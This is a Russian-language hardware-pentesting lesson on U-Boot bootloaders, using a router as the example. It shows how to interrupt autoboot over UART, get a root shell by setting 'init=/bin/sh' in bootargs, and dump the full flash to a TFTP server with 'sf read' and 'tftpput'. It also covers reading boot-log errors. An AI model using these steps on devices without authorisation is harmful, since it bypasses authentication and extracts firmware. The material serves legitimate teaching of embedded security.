## Вопрос, с которого всё начинается

В прошлом уроке мы сняли дамп SPI-флеша и увидели через `binwalk`, что по смещению `0x0` лежит **U-Boot**, а по `0x40000` — его окружение. Но что это за программа и почему она вообще оказывается на плате раньше всех?

Загрузчик — это первый код, который запускается на устройстве после подачи питания. И для пентестера это часто самая открытая дверь в систему: его консоль нередко вообще без пароля, а команды умеют читать и записывать память. Разберёмся, что это за зверь, на примере того же роутера.

## Наш пример: тот же роутер, теперь через UART

У нас уже есть UART-консоль роутера (из урока про UART) и дамп флеша (из урока про SPI). В дампе загрузчик виден как кусок данных, а на живой плате — как программа, которая печатает текст в терминал. Соберём картину с двух сторон.

Сначала — что вообще должен делать загрузчик. Он выполняет четыре вещи: инициализирует память и питание, проверяет образы, загружает операционную систему из флеша и даёт отладочную консоль. Именно последний пункт нас и интересует.

## Шаг 1: знакомимся с семействами загрузчиков

Загрузчики бывают разные, и важно уметь определить, с каким имеешь дело:

| Загрузчик | Где встречается | Особенность |
|-----------|-----------------|-------------|
| U-Boot | ARM, MIPS, RISC-V, x86 | король embedded Linux |
| UEFI/EDK2 | современный x86 и серверы | стандарт, фазы SEC/PEI/DXE/BDS |
| coreboot | Chromebook, серверы | быстрый, собран из payload-модулей |
| bootROM | любой SoC | неизменяемый код внутри кремния |
| Barebox | ARM, x86 | альтернатива U-Boot |

В роутерах и камерах почти всегда **U-Boot**. Его и увидел `binwalk` в нашем дампе.

## Шаг 2: перехватываем консоль загрузчика

Подключаемся по UART (скорость `115200`) и перезагружаем плату. В терминал льётся загрузочный лог:

```
U-Boot 2018.03 (Nov 12 2019 - 10:23:45 +0000)
DRAM:  128 MiB
NAND:  256 MiB
Hit any key to stop autoboot:  2
```

Строка `Hit any key to stop autoboot` — это приглашение: если успеть нажать любую клавишу в отведённые секунды, автозагрузка прервётся и мы попадём в командную строку загрузчика, приглашение `=>`:

```
=>
```

Мы внутри U-Boot. Это уже полноценная среда с десятками команд.

## Шаг 3: осматриваемся командами U-Boot

Начнём с того, что уже загружено в настройках:

```
=> printenv bootcmd
bootcmd=sf probe 0; sf read 0x80000000 0x20000 0x300000; bootm 0x80000000
```

`printenv` выводит переменные окружения. Переменная `bootcmd` — это сценарий обычной загрузки. Читаем его по частям: `sf probe 0` — «включи SPI-флеш номер 0», `sf read 0x80000000 0x20000 0x300000` — «прочитай из флеша, начиная со смещения `0x20000`, три мегабайта, в память по адресу `0x80000000`», `bootm 0x80000000` — «запусти то, что лежит по этому адресу».

Есть и команды работы с памятью напрямую: `md` (memory display) показывает содержимое памяти, `mw` (memory write) — записывает. `help` выводит полный список команд.

## Шаг 4: заставляем ядро дать root shell

Самый знаменитый приём через загрузчик — подменить параметры загрузки ядра. Ядру Linux можно передать строку `bootargs`, где есть параметр `init=` — какую программу запускать первой. Обычно там настоящий init-процесс, но мы поставим `init=/bin/sh`:

```
=> setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rw init=/bin/sh'
=> saveenv
=> boot
# ... ядро стартует
/bin/sh: can't access tty; job control turned off
/ # id
uid=0(root) gid=0(root)
```

`setenv` меняет переменную, `saveenv` сохраняет её в флеш, `boot` запускает загрузку. Вместо нормальной инициализации ядро сразу запустило `sh` — и мы получили оболочку с правами root. Аутентификацию мы вообще не проходили: она происходит позже, в штатной загрузке.

Если `saveenv` не срабатывает (область окружения защищена от записи), `setenv bootargs ...` можно задать без сохранения — на одну текущую загрузку.

## Шаг 5: выгружаем флеш через загрузчик

Загрузчик умеет читать флеш в память и отдавать её по сети. Это способ снять дамп, не выпаивая чип и не цепляя клипсу:

```
=> sf probe 0
=> sf read 0x80000000 0x0 0x800000   # весь образ 8 МБ в RAM
=> setenv ipaddr 192.168.1.50
=> setenv serverip 192.168.1.10
=> tftpput 0x80000000 0x800000 dump.bin
```

`tftpput` отправляет кусок памяти на TFTP-сервер (`serverip`), который мы подняли на своём хосте. Быстрее и надёжнее, чем программатор.

## Шаг 6: читаем логи загрузки

Отдельная польза от консоли — диагностика. Когда устройство «не грузится», именно загрузочный лог объясняет почему. Типовые сообщения и их смысл:

- `Bad Magic Number` — образ ядра не в формате U-Boot (нет правильного заголовка).
- `Bad Linux ARM zImage magic` — ядро другого формата.
- `mmc init failed` — загрузчик не видит встроенную память eMMC.
- `hash mismatch` / `signature verification failed` — не прошла проверка подписи.

Порядок разбора прост: сначала `printenv` и проверка `bootcmd`/`bootargs`, затем проверка носителя (`sf probe`, `mmc list`), потом чтение образа в память и команда `iminfo`, которая читает заголовок и говорит, валиден ли образ. И только потом — загрузка. Умение читать эти строки экономит часы и точно указывает, что сломано: окружение, образ или само железо.

## Что мы теперь знаем

По-простому:

1. Загрузчик запускается первым и часто даёт консоль без пароля.
2. U-Boot — самый частый загрузчик в embedded; его приглашение — `=>`.
3. `printenv`/`setenv` читают и меняют окружение, `saveenv` пишет его в флеш.
4. `init=/bin/sh` в `bootargs` даёт root shell в обход логина.
5. `sf read` + `tftpput` позволяют снять дамп флеша по сети.

## На что смотреть дальше

- **«Мусор» в терминале.** Не тот бод-рейт — перебирайте `115200`/`57600`/`38400`.
- **`saveenv` падает с ошибкой записи.** Область окружения защищена — задавайте `bootargs` без сохранения.
- **Правка `bootcmd` без бэкапа.** Сначала `printenv`, сохраните вывод: битое окружение окирпичит плату.
- **Консоль под паролем.** Обходится чтением флеша программатором и разбором образа.
- **`Bad Magic Number`.** Ядро не того формата — проверьте заголовок uImage.
